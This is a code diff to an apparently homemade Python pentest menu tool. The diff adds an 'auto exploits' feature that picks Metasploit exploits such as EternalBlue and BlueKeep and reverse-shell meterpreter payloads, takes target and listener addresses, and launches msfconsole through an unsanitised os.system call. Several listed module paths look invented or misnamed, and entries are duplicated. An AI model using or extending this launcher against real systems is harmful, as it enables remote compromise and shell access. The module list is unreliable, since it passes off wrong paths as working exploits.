@@ -513,62 +513,132 @@ def run_routersploit():
 
     except Exception as e:
         print(Fore.RED + f"Error running RouterSploit: {e}")
+import os
+from colorama import Fore
+
 def metasploit_scan():
     try:
         while True:
-            print(Fore.YELLOW+"99. to return to main menu")
-            print("1. launch Metasploit")
+            print(Fore.YELLOW + "99. to return to main menu")
+            print("1. Launch Metasploit")
+            print("2. Auto exploits")
             choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
 
-            print(Fore.YELLOW + f"launching Metasploit...: '{choice}'")
+            print(Fore.YELLOW + f"Choice: '{choice}'")
 
             metasploit_commands = ""
             ip = ""
 
-            if choice == '':  
-                ip = get_ip_address() 
-                if not ip:
-
-                    return
-
-                metasploit_commands = f""
-            elif choice == '':  
-                ip = get_ip_address()  
-                if not ip:
-                    print(Fore.RED + "")
-                    return
-                metasploit_commands = input(Fore.BLUE + "")
-            elif choice == '1':  
+            if choice == '1':  
                 print(Fore.LIGHTCYAN_EX + "Launching manual Metasploit...")
                 os.system("msfconsole")
                 continue
-            elif choice == '':  
-                print(Fore.BLUE + "")
+            elif choice == '2':  
+                print(Fore.LIGHTCYAN_EX + "Launching Auto exploits...")
 
-                
+                # List of 20 network exploits
                 exploits = {
-
+                    "1": "exploit/windows/smb/ms17_010_eternalblue",
+                    "2": "exploit/windows/smb/ms08_067_netapi",
+                    "3": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+                    "4": "exploit/unix/ssh/sshexec",
+                    "5": "exploit/unix/webapp/apache_mod_cgi_bash_env_exec",
+                    "6": "exploit/unix/webapp/php_cgi_arg_injection",
+                    "7": "exploit/unix/webapp/php_include",
+                    "8": "exploit/unix/ftp/proftpd_133c_backdoor",
+                    "9": "exploit/unix/ftp/anonymous",
+                    "10": "exploit/unix/ldap/ldap_exploit",
+                    "11": "exploit/linux/mysql/mysql_auth_bypass",
+                    "12": "exploit/windows/mssql/mssql_payload",
+                    "13": "exploit/windows/mssql/mssql_ping",
+                    "14": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+                    "15": "exploit/windows/smb/ms20_0796_smbv3_lpe",
+                    "16": "exploit/windows/mssql/mssql_ping",
+                    "17": "exploit/windows/smb/ms17_010_eternalblue",
+                    "18": "exploit/windows/smb/ms08_067_netapi",
+                    "19": "exploit/unix/samba/samba_symlink_traversal",
+                    "20": "exploit/unix/samba/samba_symlink_traversal"
                 }
 
-                
+                # Display all exploits
+                print(Fore.YELLOW + "Select the exploit you want to use:")
                 for key, value in exploits.items():
                     print(f"{key}: {value}")
 
-                exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
-
-                
-                print(Fore.YELLOW + f"DEBUG: Exploit choice input: '{exploit_choice}'")
+                exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to use: ").strip()
 
                 if exploit_choice in exploits:
-                    ip = get_ip_address()  
-                    if not ip:
-                        print(Fore.RED + "No IP address provided. Returning to the main menu...")
-                        return
+                    # Set the exploit
+                    exploit = exploits[exploit_choice]
+                    metasploit_commands += f"use {exploit}; "
+                    print(Fore.YELLOW + f"Selected exploit: {exploit}")
 
-                    metasploit_commands = f"use {exploits[exploit_choice]} \nset RHOSTS {ip} \nrun"
+                    # Select payload
+                    payloads = {
+                        "1": "windows/x64/meterpreter/reverse_tcp",
+                        "2": "linux/x86/meterpreter/reverse_tcp",
+                        "3": "cmd/unix/reverse_bash",
+                        "4": "windows/meterpreter/bind_tcp",
+                        "5": "php/meterpreter/reverse_tcp"
+                    }
+
+                    print(Fore.YELLOW + "Select payload:")
+                    for key, value in payloads.items():
+                        print(f"{key}: {value}")
+
+                    payload_choice = input(Fore.BLUE + "\nEnter the number of the payload you want to use: ").strip()
+
+                    if payload_choice in payloads:
+                        payload = payloads[payload_choice]
+                        metasploit_commands += f"set PAYLOAD {payload}; "
+                        print(Fore.YELLOW + f"Selected payload: {payload}")
+
+                        # Set LHOST or RHOST
+                        host_choice = input(Fore.BLUE + "\nSelect host (LHOST or RHOST): ").strip()
+
+                        if host_choice.lower() == "lhost":
+                            lhost = input(Fore.BLUE + "Enter LHOST: ").strip()
+                            metasploit_commands += f"set LHOST {lhost}; "
+                            print(Fore.YELLOW + f"Set LHOST: {lhost}")
+                        elif host_choice.lower() == "rhost":
+                            rhost = input(Fore.BLUE + "Enter RHOST: ").strip()
+                            metasploit_commands += f"set RHOST {rhost}; "
+                            print(Fore.YELLOW + f"Set RHOST: {rhost}")
+                        else:
+                            print(Fore.RED + "Invalid choice for host. Exiting...")
+                            continue
+
+                        # Set LPORT or RPORT
+                        port_choice = input(Fore.BLUE + "\nSelect port (LPORT or RPORT): ").strip()
+
+                        if port_choice.lower() == "lport":
+                            lport = input(Fore.BLUE + "Enter LPORT: ").strip()
+                            metasploit_commands += f"set LPORT {lport}; "
+                            print(Fore.YELLOW + f"Set LPORT: {lport}")
+                        elif port_choice.lower() == "rport":
+                            rport = input(Fore.BLUE + "Enter RPORT: ").strip()
+                            metasploit_commands += f"set RPORT {rport}; "
+                            print(Fore.YELLOW + f"Set RPORT: {rport}")
+                        else:
+                            print(Fore.RED + "Invalid choice for port. Exiting...")
+                            continue
+
+                        # Finalizing the full command to run in msfconsole
+                        metasploit_commands += "run"
+
+                        # Execute the full Metasploit command with proper quotes
+                        command_to_run = f"msfconsole -q -x \"{metasploit_commands}\""
+                        print(Fore.YELLOW + f"Full command to execute: \n{command_to_run}")
+
+                        # Run the command
+                        os.system(command_to_run)
+                    else:
+                        print(Fore.RED + "Invalid payload choice. Exiting...")
+                        continue
                 else:
-                    print(Fore.RED + "Invalid exploit choice.")
+                    print(Fore.RED + "Invalid exploit choice. Exiting...")
                     continue
+
             elif choice == '99':  
                 print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
                 break
@@ -576,30 +646,9 @@ def metasploit_scan():
                 print(Fore.RED + "Invalid choice. Please try again.")
                 continue
 
-           
-            if metasploit_commands:
-                print(Fore.BLUE + "Launching Metasploit...")
-
-                
-                print(Fore.YELLOW + f"DEBUG: Full Metasploit commands:\n{metasploit_commands}")
-
-                
-                full_command = f"msfconsole -q -x \"{metasploit_commands}\""
-                print(Fore.YELLOW + f"Executing: {full_command}")  
-
-               
-                result = os.system(full_command)
-
-               
-                if result != 0:
-                    print(Fore.RED + f"Error: Metasploit command failed with exit code {result}")
-                break  
-
     except Exception as e:
         print(Fore.RED + f"Error running Metasploit: {e}")
-def clear_screen():
-    """Clear the screen based on the OS."""
-    os.system('cls' if os.name == 'nt' else 'clear')
+
 
 def run_tracepath():
     """Function to run tracepath interactively."""
